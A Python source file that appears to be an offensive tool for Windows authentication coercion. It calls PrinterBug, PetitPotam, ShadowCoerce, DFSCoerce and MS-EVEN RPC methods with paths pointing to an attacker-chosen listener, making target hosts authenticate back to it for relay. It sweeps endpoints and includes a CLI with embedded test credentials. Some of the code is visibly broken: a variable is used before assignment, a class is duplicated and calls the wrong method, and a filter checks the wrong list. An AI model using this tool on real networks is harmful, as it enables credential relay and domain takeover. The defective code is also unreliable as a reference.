import asyncio
import random
import string
import re
import sys

from abc import ABC, abstractmethod
from aiosmb.commons.connection.factory import SMBConnectionFactory
from aiosmb.commons.interfaces.machine import SMBMachine
from aiosmb.dcerpc.v5.interfaces.rprnmgr import RPRNRPC
from aiosmb.dcerpc.v5.interfaces.fsrvpmgr import FSRVPRPC
from aiosmb.dcerpc.v5.interfaces.evenmgr import EVENRPC
from aiosmb.dcerpc.v5.interfaces.efsrmgr import EFSRRPC
from aiosmb.dcerpc.v5.interfaces.dfsnmmgr import DFSNMRPC

from aiosmb.dcerpc.v5.rprn import PRINTER_CHANGE_ADD_JOB
from aiosmb.dcerpc.v5.rpcrt import DCERPCException



COERSION_PROTOCOL_NAME_MAP = {
	'RPRN' : RPRNRPC,
	'FSRVP' : FSRVPRPC,
	'EVEN' : EVENRPC,
	'EFSR' : EFSRRPC,
	'DFSNM' : DFSNMRPC
}

class CoersionModule(ABC):
	def __init__(self):
		pass

	@classmethod
	@abstractmethod
	def protocol(cls):
		raise NotImplementedError("Must be implemented in the child class")
	
	@classmethod
	@abstractmethod
	def paths(cls):
		raise NotImplementedError("Must be implemented in the child class")
	
	@classmethod
	def get_path(cls, listener_config, path_template):
		if path_template[0] != listener_config[0]:
			raise Exception('Invalid path template! %s %s' % (path_template, listener_config))
		
		
		path = path_template[1]
		path = re.sub(r'\{rnd\((\d+)\)\}', cls.rnd_replacer, path)  # Replace all `rnd(x)` placeholders

		return path.format(
				listener=listener_config[1], 
				listen_port='@'+str(listener_config[2]) if listener_config[2] != 445 else '',
			)
	
	@classmethod
	def rnd_replacer(cls, match):
		length = int(match.group(1))  # Extract the number inside `rnd(x)`
		return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

	@classmethod
	def supported_path_types(cls, url_str):
		return cls.paths()
	
class RpcRemoteFindFirstPrinterChangeNotificationEx(CoersionModule):
	def __init__(self):
		super().__init__()
	
	@classmethod
	def protocol(cls):
		return 'RPRN'
	
	@classmethod
	def paths(cls):
		return [
			('smb', '\\\\{listener}\\'),
			('http', '\\\\{listener}@{listen_port}/{rnd(3)}')
		]
	
	@classmethod
	async def run(cls, rpc, listener_config, path_template):
		try:
			path = cls.get_path(listener_config, path_template)
			printer = '\\\\%s' % listener_config[1]
			handle, err = await rpc.open_printer(printer)
			if err is not None:
				raise err
			res, err = await rpc.hRpcRemoteFindFirstPrinterChangeNotificationEx(
				handle, 
				PRINTER_CHANGE_ADD_JOB,
				pszLocalMachine = path
			)
			if err is not None:
				raise err
			return True, None
		except DCERPCException as e:
			return None, e

class RpcRemoteFindFirstPrinterChangeNotification(CoersionModule):
	def __init__(self):
		super().__init__()
	
	@classmethod
	def protocol(cls):
		return 'RPRN'
	
	@classmethod
	def paths(cls):
		return [
			('smb', '\\\\{listener}\\'),
			('http', '\\\\{listener}@{listen_port}/{rnd(3)}')
		]
	
	@classmethod
	async def run(cls, rpc, listener_config, path_template):
		try:
			path = cls.get_path(listener_config, path_template)
			printer = '\\\\%s' % listener_config[1]
			handle, err = await rpc.open_printer(printer)
			if err is not None:
				raise err
			res, err = await rpc.hRpcRemoteFindFirstPrinterChangeNotification(
				handle, 
				PRINTER_CHANGE_ADD_JOB,
				pszLocalMachine = path
			)
			if err is not None:
				raise err
			return True, None
		except DCERPCException as e:
			return None, e

class IsPathShadowCopied(CoersionModule):
	def __init__(self):
		super().__init__()
	
	@classmethod
	def protocol(cls):
		return 'FSRVP'
	
	@classmethod
	def paths(cls):
		return [
			('smb', '\\\\{listener}\\'),
			('http', '\\\\{listener}@{listen_port}/{rnd(3)}')
		]
	
	@classmethod
	async def run(cls, rpc, listener_config, path_template):
		try:
			path = cls.get_path(listener_config, path_template)
			if err is not None:
				raise err
			res, err = await rpc.hRpcIsPathShadowCopied(
				path
			)
			if err is not None:
				raise err
			return True, None
		except DCERPCException as e:
			return None, e
		
class IsPathSupported(CoersionModule):
	def __init__(self):
		super().__init__()
	
	@classmethod
	def protocol(cls):
		return 'FSRVP'
	
	@classmethod
	def paths(cls):
		return [
			('smb', '\\\\{listener}\\'),
			('http', '\\\\{listener}@{listen_port}/{rnd(3)}')
		]
	
	@classmethod
	async def run(cls, rpc, listener_config, path_template):
		try:
			path = cls.get_path(listener_config, path_template)
			res, err = await rpc.hRpcIsPathSupported(
				path
			)
			if err is not None:
				raise err
			return True, None
		except DCERPCException as e:
			return None, e

class ElfrOpenBELW(CoersionModule):
	def __init__(self):
		super().__init__()
	
	@classmethod
	def protocol(cls):
		return 'EVEN'
	
	@classmethod
	def paths(cls):
		return [
			('smb', '\\??\\UNC\\{listener}{listen_port}\\{rnd(8)}\\aa')
		]
	
	@classmethod
	async def run(cls, rpc, listener_config, path_template):
		try:
			path = cls.get_path(listener_config, path_template)
			res, err = await rpc.hElfrOpenBELW(
				path
			)
			if err is not None:
				raise err
			return True, None
		except DCERPCException as e:
			return None, e
		
class EfsRpcRemoveUsersFromFile(CoersionModule):
	def __init__(self):
		super().__init__()
	
	@classmethod
	def protocol(cls):
		return 'EFSR'
	
	@classmethod
	def paths(cls):
		return [
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\file.txt'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}'),
			("http", '\\\\{listener}{listen_port}/{rnd(3)}\\share\\file.txt'),
		]
	
	@classmethod
	async def run(cls, rpc, listener_config, path_template):
		try:
			path = cls.get_path(listener_config, path_template)
			res, err = await rpc.hRpcEfsRpcRemoveUsersFromFile(
				path
			)
			if err is not None:
				raise err
			return True, None
		except DCERPCException as e:
			return None, e
		
class EfsRpcQueryUsersOnFile(CoersionModule):
	def __init__(self):
		super().__init__()
	
	@classmethod
	def protocol(cls):
		return 'EFSR'
	
	@classmethod
	def paths(cls):
		return [
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\file.txt'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}'),
			("http", '\\\\{listener}{listen_port}/{rnd(3)}\\share\\file.txt'),
		]
	
	@classmethod
	async def run(cls, rpc, listener_config, path_template):
		try:
			path = cls.get_path(listener_config, path_template)
			res, err = await rpc.hRpcEfsRpcQueryUsersOnFile(
				path
			)
			if err is not None:
				raise err
			return True, None
		except DCERPCException as e:
			return None, e
		
class EfsRpcQueryRecoveryAgents(CoersionModule):
	def __init__(self):
		super().__init__()
	
	@classmethod
	def protocol(cls):
		return 'EFSR'
	
	@classmethod
	def paths(cls):
		return [
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\file.txt'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}'),
			("http", '\\\\{listener}{listen_port}/{rnd(3)}\\share\\file.txt'),
		]
	
	@classmethod
	async def run(cls, rpc, listener_config, path_template):
		try:
			path = cls.get_path(listener_config, path_template)
			res, err = await rpc.hRpcEfsRpcQueryRecoveryAgents(
				path
			)
			if err is not None:
				raise err
			return True, None
		except DCERPCException as e:
			return None, e
		
		
class EfsRpcOpenFileRaw(CoersionModule):
	def __init__(self):
		super().__init__()
	
	@classmethod
	def protocol(cls):
		return 'EFSR'
	
	@classmethod
	def paths(cls):
		return [
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\file.txt'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}'),
			("http", '\\\\{listener}{listen_port}/{rnd(3)}\\share\\file.txt'),
		]
	
	@classmethod
	async def run(cls, rpc, listener_config, path_template):
		try:
			path = cls.get_path(listener_config, path_template)
			res, err = await rpc.hRpcEfsRpcOpenFileRaw(
				path
			)
			if err is not None:
				raise err
			return True, None
		except DCERPCException as e:
			return None, e
		
class EfsRpcFileKeyInfo(CoersionModule):
	def __init__(self):
		super().__init__()
	
	@classmethod
	def protocol(cls):
		return 'EFSR'
	
	@classmethod
	def paths(cls):
		return [
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\file.txt'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}'),
			("http", '\\\\{listener}{listen_port}/{rnd(3)}\\share\\file.txt'),
		]
	
	@classmethod
	async def run(cls, rpc, listener_config, path_template):
		try:
			path = cls.get_path(listener_config, path_template)
			res, err = await rpc.hRpcEfsRpcFileKeyInfo(
				path
			)
			if err is not None:
				raise err
			return True, None
		except DCERPCException as e:
			return None, e
	
class EfsRpcEncryptFileSrv(CoersionModule):
	def __init__(self):
		super().__init__()
	
	@classmethod
	def protocol(cls):
		return 'EFSR'
	
	@classmethod
	def paths(cls):
		return [
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\file.txt'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}'),
			("http", '\\\\{listener}{listen_port}/{rnd(3)}\\share\\file.txt'),
		]
	
	@classmethod
	async def run(cls, rpc, listener_config, path_template):
		try:
			path = cls.get_path(listener_config, path_template)
			res, err = await rpc.hRpcEfsRpcEncryptFileSrv(
				path
			)
			if err is not None:
				raise err
			return True, None
		except DCERPCException as e:
			return None, e
		
	
class EfsRpcDuplicateEncryptionInfoFile(CoersionModule):
	def __init__(self):
		super().__init__()
	
	@classmethod
	def protocol(cls):
		return 'EFSR'
	
	@classmethod
	def paths(cls):
		return [
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\file.txt'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}'),
			("http", '\\\\{listener}{listen_port}/{rnd(3)}\\share\\file.txt'),
		]
	
	@classmethod
	async def run(cls, rpc, listener_config, path_template):
		try:
			path = cls.get_path(listener_config, path_template)
			res, err = await rpc.hRpcEfsRpcDuplicateEncryptionInfoFile(
				path,
				path
			)
			if err is not None:
				raise err
			return True, None
		except DCERPCException as e:
			return None, e

class EfsRpcDecryptFileSrv(CoersionModule):
	def __init__(self):
		super().__init__()
	
	@classmethod
	def protocol(cls):
		return 'EFSR'
	
	@classmethod
	def paths(cls):
		return [
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\file.txt'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}'),
			("http", '\\\\{listener}{listen_port}/{rnd(3)}\\share\\file.txt'),
		]
	
	@classmethod
	async def run(cls, rpc, listener_config, path_template):
		try:
			path = cls.get_path(listener_config, path_template)
			res, err = await rpc.hRpcEfsRpcDecryptFileSrv(
				path,
			)
			if err is not None:
				raise err
			return True, None
		except DCERPCException as e:
			return None, e

class EfsRpcAddUsersToFileEx(CoersionModule):
	def __init__(self):
		super().__init__()
	
	@classmethod
	def protocol(cls):
		return 'EFSR'
	
	@classmethod
	def paths(cls):
		return [
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\file.txt'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}'),
			("http", '\\\\{listener}{listen_port}/{rnd(3)}\\share\\file.txt'),
		]
	
	@classmethod
	async def run(cls, rpc, listener_config, path_template):
		try:
			path = cls.get_path(listener_config, path_template)
			res, err = await rpc.hRpcEfsRpcAddUsersToFileEx(
				path,
			)
			if err is not None:
				raise err
			return True, None
		except DCERPCException as e:
			return None, e


class EfsRpcAddUsersToFile(CoersionModule):
	def __init__(self):
		super().__init__()
	
	@classmethod
	def protocol(cls):
		return 'EFSR'
	
	@classmethod
	def paths(cls):
		return [
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\file.txt'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}'),
			("http", '\\\\{listener}{listen_port}/{rnd(3)}\\share\\file.txt'),
		]
	
	@classmethod
	async def run(cls, rpc, listener_config, path_template):
		try:
			path = cls.get_path(listener_config, path_template)
			res, err = await rpc.hRpcEfsRpcAddUsersToFile(
				path,
			)
			if err is not None:
				raise err
			return True, None
		except DCERPCException as e:
			return None, e


	
class hNetrDfsRemoveStdRoot(CoersionModule):
	def __init__(self):
		super().__init__()
	
	@classmethod
	def protocol(cls):
		return 'DFSNM'
	
	@classmethod
	def paths(cls):
		return [
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\file.txt'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}'),
			("http", '\\\\{listener}{listen_port}/{rnd(3)}\\share\\file.txt'),
		]
	
	@classmethod
	async def run(cls, rpc, listener_config, path_template):
		try:
			path = cls.get_path(listener_config, path_template)
			rootShare = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
			res, err = await rpc.hRpcNetrDfsAddStdRoot(
				path,
				rootShare
			)
			if err is not None:
				raise err
			return True, None
		except DCERPCException as e:
			return None, e

class hNetrDfsRemoveStdRoot(CoersionModule):
	def __init__(self):
		super().__init__()
	
	@classmethod
	def protocol(cls):
		return 'DFSNM'
	
	@classmethod
	def paths(cls):
		return [
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\file.txt'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}\\'),
			("smb", '\\\\{listener}{listen_port}\\{rnd(8)}'),
			("http", '\\\\{listener}{listen_port}/{rnd(3)}\\share\\file.txt'),
		]
	
	@classmethod
	async def run(cls, rpc, listener_config, path_template):
		try:
			path = cls.get_path(listener_config, path_template)
			rootShare = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
			res, err = await rpc.hRpcNetrDfsAddStdRoot(
				path,
				rootShare
			)
			if err is not None:
				raise err
			return True, None
		except DCERPCException as e:
			return None, e

async def dummy_print(msg):
	print(msg)

class Coersion():
	def __init__(self, factory:SMBConnectionFactory, delay_ms:int = None, print_cb = dummy_print):
		self.factory = factory
		self.modules = {}
		self.include_modules = []
		self.include_protocols = []
		self.include_path_types = []
		self.include_transports = []
		self.auth_types = []
		self.listeners = {}
		self.print_cb = print_cb
		self.delay_ms = delay_ms

	async def print(self, msg):
		if self.print_cb is None:
			return
		await self.print_cb(msg)
	
	def create_default_listeners(self, listen_ip):
		self.listeners = {
			'smb'  : [('smb', listen_ip, 445)],
			'http' : [('http', listen_ip, 80)]
		}

	def load_local_modules(self):
		#import __main__
		current_module = sys.modules[__name__]
		for cls in CoersionModule.__subclasses__():
			if cls.__module__ == current_module.__name__:
				self.load_module(cls)
			
	def load_module(self, module):
		if module.protocol() not in self.modules:
			self.modules[module.protocol()] = []
		self.modules[module.protocol()].append(module)

	def load_listener_config(self, listener_config):
		proto, host, *port = listener_config.split(':')
		proto = proto.lower()
		if proto not in ['smb', 'http']:
			raise Exception('Invalid protocol! Must be either SMB or HTTP!')
		if len(port) == 0:
			port = None
			if proto == 'http':
				port = 80
			elif proto == 'smb':
				port = 445
			elif proto == 'https':
				port = 443
		else:
			port = int(port)
		
		if proto not in self.listeners:
			self.listeners[proto] = []
		self.listeners[proto].append((proto, host, port))

	def load_listener_configs(self, listener_config_list):
		for listener_config in listener_config_list:
			self.load_listener_config(listener_config)
	
	def get_filtered_modules(self):
		filtered_protcol = {}
		if self.include_protocols is None or len(self.include_modules) == 0:
			filtered_protcol = self.modules
		else:	
			for protcolname in self.include_protocols:
				if protcolname not in self.modules:
					continue
				filtered_protcol[protcolname] = self.modules[protcolname]
		
		if self.include_path_types is None or len(self.include_path_types) == 0:
			return filtered_protcol
		
		
		for protcolname, modules in filtered_protcol.items():
			for module in modules:
				if module.supported_path_types() not in self.include_path_types:
					filtered_protcol[protcolname].remove(module)
		return filtered_protcol
	
	def get_rpc_targets(self, module, endpoints):
		for endpoint in endpoints:
			for proto in self.listeners:
				for listener_config in self.listeners[proto]:
					for path_template in module.paths():
						if path_template[0] != proto:
							continue
						if len(self.auth_types) > 0 and proto not in self.auth_types:
							continue
						yield endpoint, listener_config, path_template
	
	async def connect_rpc(self, protoclass, endpoint):
		rpc, err = await protoclass.from_smbconnection(self.factory.get_connection(), endpoint=endpoint)
		if err is not None:
			return None, err
		return rpc, None
	
	async def test_endpoint_connection(self, protoclass, endpoint):
		rpc = None
		try:
			rpc, err = await self.connect_rpc(protoclass, endpoint)
			if err is not None:
				await self.print('   [-] Failed to connect to %s' % str(endpoint))
				return False
			await self.print('   [+] Successful bind to interface %s' % str(endpoint))
			return True
		except Exception as e:
			await self.print('   [-] %s' % e)
			return False
		finally:
			if rpc is not None:
				await rpc.close()

	async def run(self):
		try:
			if len(self.modules) == 0:
				self.load_local_modules()
			
			if len(self.listeners) == 0:
				raise Exception('No listeners configured')
			
			for protcolname, modules in self.get_filtered_modules().items():
				for module in modules:
					protoclass = COERSION_PROTOCOL_NAME_MAP[protcolname]
					# Filter out the unneeded endpoints
					endpoints = []
					if self.include_transports is None or len(self.include_transports) == 0:
						endpoints = protoclass.endpoints()
					else:
						for endpoint in protoclass.endpoints():
							if endpoint.etype not in self.include_transports:
								continue
							endpoints.append(endpoint)
					
					# Endpoints are filtered, now we can run the module
					endpoints_tested = {}

					for endpoint, listener_config, path_template in self.get_rpc_targets(module, endpoints):
						if self.delay_ms is not None:
							await asyncio.sleep(self.delay_ms/1000)

						if endpoint not in endpoints_tested:
							endpoints_tested[endpoint] = await self.test_endpoint_connection(protoclass, endpoint)
						if endpoints_tested[endpoint] is False:
							continue
						
						rpc, err = await self.connect_rpc(protoclass, endpoint)
						if err is not None:
							await self.print('   [!] Failed to connect to %s' % str(endpoint))
							continue

						async with rpc:	
							_, err = await module.run(rpc, listener_config, path_template)
							# we expect an exception here
							await self.print('      [?] %s' % err)
			return True, None
		except Exception as e:
			await self.print('[-] %s' % e)
			return False, e
			


async def test(url_str):
	import argparse
	parser = argparse.ArgumentParser(description='Coersion module')
	parser.add_argument('-v', '--verbose', action='count', default=0)
	parser.add_argument('--depth', type=int, default=3, help='Recursion depth, -1 means infinite')
	parser.add_argument('-w', '--smb-worker-count', type=int, default=100, help='Parallell count')
	parser.add_argument('-o', '--out-file', help='Output file path.')
	parser.add_argument('-s', '--stdin', action='store_true', help='Read targets from stdin')

	parser.add_argument('--delay', type=int, help = 'Delay between requests')

	#parser.add_argument('--filter-transport-name', action='append', help = 'Filter transport')
	parser.add_argument('--filter-pipe-name', action='append', help = 'Filter pipe')
	parser.add_argument('--filter-protocol-name', action='append', help = 'Filter protocol name')
	parser.add_argument('--filter-method-name', action='append', help = 'Filter method name')
	parser.add_argument('--auth-type', action='append', help = 'Limit auth type')


	parser.add_argument('-l', '--listen-ip', help='IP address to coerse the target to connect back to')
	parser.add_argument('url', help = 'Connection string that describes the authentication and target. Example: smb+ntlm-password://TEST\\Administrator:password@127.0.0.1')

	parser.add_argument('targets', nargs='*', help = 'Hostname or IP address or file with a list of targets')

	args = parser.parse_args()

	if args.listen_ip is None:
		print('You need to specify a listen IP!')
		return
	
	listener_configs = {
		'smb'  : [('smb', args.listen_ip, 445)],
		'http' : [('http', args.listen_ip, 80)]
	}
	
	factory = SMBConnectionFactory.from_url(url_str)
	coersion = Coersion(factory, delay_ms = args.delay)
	coersion.listeners = listener_configs
	coersion.auth_types = args.auth_type
	coersion.include_path_types = args.filter_pipe_name
	coersion.include_protocols = args.filter_protocol_name
	coersion.include_modules = args.filter_method_name

	print(args)

	await coersion.run()
	

if __name__ == '__main__':
	url = 'smb2+ntlm-password://hodor:hodor@192.168.56.22'
	asyncio.run(test(url))